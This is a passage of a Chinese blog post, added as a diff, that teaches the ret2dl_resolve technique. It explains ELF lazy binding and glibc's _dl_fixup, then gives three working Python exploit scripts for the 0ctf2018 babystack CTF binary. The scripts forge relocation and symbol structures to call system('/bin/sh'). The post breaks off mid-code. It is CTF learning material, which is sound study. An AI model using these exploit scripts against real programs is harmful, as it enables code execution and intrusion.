@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      ret2dl_resolve 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ret2dl_resolve</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-29 17:24:15
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/stack/" title="stack">
+                    #stack
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h1><p>介绍：</p>
+<p>基于延迟绑定技术，通过伪造数据结构以及对函数延迟绑定过程的拦截，实现任意函数调用的目的</p>
+<h2 id="延迟绑定技术："><a href="#延迟绑定技术：" class="headerlink" title="延迟绑定技术："></a>延迟绑定技术：</h2><p>调用函数时：call func@plt：</p>
+<pre class="language-c" data-language="c"><code class="language-c">func@plt<span class="token punctuation">;</span>
+jmp <span class="token operator">*</span><span class="token punctuation">(</span>func@GOT<span class="token punctuation">)</span> <span class="token comment">//首先进行GOT跳转，尝试第一次链接</span>
+push n   <span class="token comment">//压入需要地址绑定的符号在重定位表中的下标</span>
+jmp PLT0   <span class="token comment">//跳转至PLT0</span></code></pre>
+
+<p>第一次调用时，func@GOT表中的值为接下来push n指令地址&#x3D;&#x3D;》</p>
+<p>程序执行push n&#x3D;&#x3D;》n为该函数在.rel.plt表中的偏移</p>
+<p>接下来jmp PLT0&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//PLT0中</span>
+
+push <span class="token operator">*</span><span class="token punctuation">(</span>got<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">//link_map的地址</span>
+jmp <span class="token operator">*</span><span class="token punctuation">(</span>got<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment">//_dl_runtime_resolve地址</span></code></pre>
+
+<p>&#x3D;&#x3D;》进入_dl_runtime_resolve函数&#x3D;&#x3D;》函数调用_dl_fixup函数:</p>
+<p>1、程序先从第一个参数link_map获取字符串表.dynstr，符号表.dynsym，重定位表.rel.plt的地址</p>
+<p>2、通过第二个参数n&#x3D;&#x3D;》即.rel.plt表中的偏移reloc_index加上.rel.plt的地址获取函数对应的重定位结构的位置&#x3D;&#x3D;》从而获取函数对应的r_offset以及符号表中的下标r_info&gt;&gt;8</p>
+<p>3、根据符号表地址以及下标获取符号结构体，获得函数符号中的st_name（函数名相对于字符串.dynstr的偏移）</p>
+<p>4、最后得到函数名的字符串&#x3D;&#x3D;》前往libc中匹配函数名，寻找相应的函数并将地址填回r_offset，即函数got表中，完成延迟绑定</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/watermark%252Ctype_ZmFuZ3poZW5naGVpdGk%252Cshadow_10%252Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3%252Csize_16%252Ccolor_FFFFFF%252Ct_70.png"></p>
+<h2 id="32位ret2dl-resolve"><a href="#32位ret2dl-resolve" class="headerlink" title="32位ret2dl_resolve"></a>32位ret2dl_resolve</h2><h4 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h4><p>适用于无法泄漏程序地址时，通过拦截延迟绑定的过程，实现对函数地址解析过程的劫持，使最终解析出来的函数为特定函数的函数地址&#x3D;&#x3D;》实现无泄漏达到特定函数调用的目的</p>
+<h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><p>&#x3D;&#x3D;》伪造reloc_index（伪造重定位表的下标实现相关利用）</p>
+<p>&#x3D;&#x3D;》</p>
+<p>1、伪造reloc_index,使reloc_index加上.rel.plt的地址指向可控的地址，在该地址可伪造恶意的Elf32_Rel结构体</p>
+<p>2、伪造Elf32_Rel结构体中的r_offset指向某一可写地址，最终函数地址会写入该地址处，伪造r_info&amp;0xff为0x7</p>
+<p>，因为类型需要为ELF_MACHINE_JMP_SLOT以绕过类型验证，伪造r_info&gt;&gt;8，使得r_info&gt;&gt;8加上.dynsym地址指向可控的地址，并在该地址伪造符号表结构体Elf32_Sym</p>
+<p>伪造r_info&amp;0xff为0x7：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>3、伪造Elf32_Sym结构体中的st_name,使得.dynstr的地址加上该值指向可控地址，并在该地址处写入特定函数的函数名(system)</p>
+<p>4、系统通过函数名匹配，定位至特定函数地址，获取该地址并写入到伪造的r_offset中，实现函数地址的获取</p>
+<h4 id="涉及的结构体："><a href="#涉及的结构体：" class="headerlink" title="涉及的结构体："></a>涉及的结构体：</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
+<span class="token punctuation">&#123;</span>
+  Elf32_Word    st_name<span class="token punctuation">;</span> <span class="token comment">//符号名，是相对.dynstr起始的偏移</span>
+  Elf32_Addr    st_value<span class="token punctuation">;</span>
+  Elf32_Word    st_size<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span> <span class="token comment">//对于导入函数符号而言，它是0x12</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>
+  Elf32_Section st_shndx<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>Elf32_Sym<span class="token punctuation">;</span> <span class="token comment">//对于导入函数符号而言，其他字段都是0</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    Elf32_Addr        r_offset<span class="token punctuation">;</span>
+    Elf32_Word       r_info<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> Elf32_Rel<span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    Elf32_Sword     d_tag<span class="token punctuation">;</span>
+    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
+        Elf32_Word  d_val<span class="token punctuation">;</span>
+        Elf32_Addr  d_ptr<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> d_un<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> Elf32_Dyn<span class="token punctuation">;</span>
+<span class="token keyword">extern</span> Elf32_Dyn_DYNAMIC<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
+
+
+
+<h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p>如果reloc-&gt;r_info伪造不当，会使</p>
+<pre class="language-none"><code class="language-none">ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff</code></pre>
+
+<p>偏大，导致</p>
+<pre class="language-none"><code class="language-none">version &#x3D; &amp;l-&gt;l_versions[ndx]</code></pre>
+
+<p>出现访存错误&#x3D;&#x3D;》</p>
+<p>在伪造reloc-&gt;r_info，最好让ndx为0，即vernum[reloc-&gt;r_info]为0</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">r_found_version</span> <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
+      <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span> <span class="token comment">//偏大</span>
+    version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//访存错误</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+      version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="0ctf2018-babystack"><a href="#0ctf2018-babystack" class="headerlink" title="0ctf2018-babystack"></a>0ctf2018-babystack</h4><p>1、检查保护</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220328171024351.png"></p>
+<h4 id="exp（模板）："><a href="#exp（模板）：" class="headerlink" title="exp（模板）："></a>exp（模板）：</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+name <span class="token operator">=</span> <span class="token string">'./babystack'</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+elf<span class="token operator">=</span> ELF<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+<span class="token comment">#获取原地址</span>
+
+rel_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr   <span class="token comment">#0x80482b0</span>
+dynsym_addr <span class="token operator">=</span>  elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    <span class="token comment">#0x80481cc</span>
+dynstr_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr     <span class="token comment">#0x804822c</span>
+
+resolve_plt <span class="token operator">=</span> <span class="token number">0x080482F0</span> <span class="token comment">#plt表的起始地址</span>
+leave_ret_addr <span class="token operator">=</span> <span class="token number">0x08048455</span> <span class="token comment">#leave_ret</span>
+start <span class="token operator">=</span> <span class="token number">0x804aa00</span>   <span class="token comment">#要在bss段进行伪造的地址</span>
+
+align<span class="token operator">=</span><span class="token number">0x8</span><span class="token operator">-</span><span class="token punctuation">(</span>start<span class="token operator">-</span><span class="token number">20</span><span class="token operator">-</span>rel_plt_addr<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x8</span> 
+start<span class="token operator">+=</span>align   <span class="token comment">#对伪造的地址进行内存对齐</span>
+<span class="token comment">#构造地址</span>
+fake_rel_plt_addr <span class="token operator">=</span> start                       <span class="token comment">#0x804aa04</span>
+fake_dynsym_addr <span class="token operator">=</span> fake_rel_plt_addr <span class="token operator">+</span> <span class="token number">0x8</span>      <span class="token comment">#0x804aa0c</span>
+fake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr <span class="token operator">+</span> <span class="token number">0x10</span>      <span class="token comment">#0x804aa1c</span>
+bin_sh_addr <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">+</span> <span class="token number">0x7</span>            <span class="token comment">#0x804aa23</span>
+n <span class="token operator">=</span> fake_rel_plt_addr <span class="token operator">-</span> rel_plt_addr            <span class="token comment">#0x2754  伪造的.rel.plt与真的偏移</span>
+r_info <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7</span>   <span class="token comment">#0x28407</span>
+str_offset <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstr_addr                     <span class="token comment">#0x27f0</span>
+fake_rel_plt <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>str_offset<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+fake_dynstr <span class="token operator">=</span> <span class="token string">"system\x00/bin/sh\x00\x00"</span>
+<span class="token comment">#构造payload</span>
+pay1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>start<span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pay1<span class="token punctuation">)</span>
+pay2 <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>resolve_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'abcd'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> fake_rel_plt <span class="token operator">+</span> fake_dynsym <span class="token operator">+</span> fake_dynstr
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pay2<span class="token punctuation">)</span>
+<span class="token comment">#成功pwn</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>
+<span class="token keyword">from</span> roputils <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> process
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> gdb
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> context
+processName <span class="token operator">=</span> <span class="token string">'main'</span>
+offset <span class="token operator">=</span> <span class="token number">112</span>
+
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./'</span> <span class="token operator">+</span> processName<span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./'</span> <span class="token operator">+</span> processName<span class="token punctuation">)</span>
+
+bss_base <span class="token operator">=</span> rop<span class="token punctuation">.</span>section<span class="token punctuation">(</span><span class="token string">'.bss'</span><span class="token punctuation">)</span>
+buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
+
+buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
+<span class="token comment">## used to call dl_Resolve()</span>
+buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_call<span class="token punctuation">(</span>bss_base <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
+
+buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span>
+<span class="token comment">## used to make faking data, such relocation, Symbol, Str</span>
+buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_data<span class="token punctuation">(</span>bss_base <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span>
+buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<pre class="language-python" data-language="python"><code class="language-python">plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
+rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
+dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
+dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
+
+index_offset<span class="token operator">=</span>base_stage<span class="token operator">+</span><span class="token number">20</span><span class="token operator">-</span>rel_plt <span class="token comment"># .rel.plt</span>
+
+fake_sym_addr<span class="token operator">=</span>base_stage<span class="token operator">+</span><span class="token number">28</span>
+align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>
+fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
+index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x10</span>
+r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>
+fake_rel_plt <span class="token operator">=</span> p32<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr
+fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
+fake_str<span class="token operator">=</span> <span class="token string">b"system"</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'AAAA'</span>               <span class="token comment"># 4</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span>           <span class="token comment"># 8</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>    <span class="token comment"># 12</span>
+payload <span class="token operator">+=</span> <span class="token string">b'aaaa'</span>              <span class="token comment"># 16</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token comment"># 20 /bin/sh</span>
+payload <span class="token operator">+=</span> fake_rel_plt         <span class="token comment"># 28</span>
+payload <span class="token operator">+=</span> align <span class="token operator">*</span> <span class="token string">b"B"</span>
+payload <span class="token operator">+=</span> fake_sym
+payload <span class="token operator">+=</span> fake_str
+payload <span class="token operator">+=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>
+payload <span class="token operator">+=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+
+
+<h2 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl_resolve"></a>64位ret2dl_resolve</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">_dl_fixup</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l<span class="token punctuation">,</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+
+  <span class="token comment">//获取符号表地址</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment">//获取字符串表地址</span>
+  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_STRTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment">//获取函数对应的重定位表结构地址</span>
+  <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment">//获取函数对应的符号表结构地址</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment">//得到函数对应的got地址，即真实函数地址要填回的地址</span>
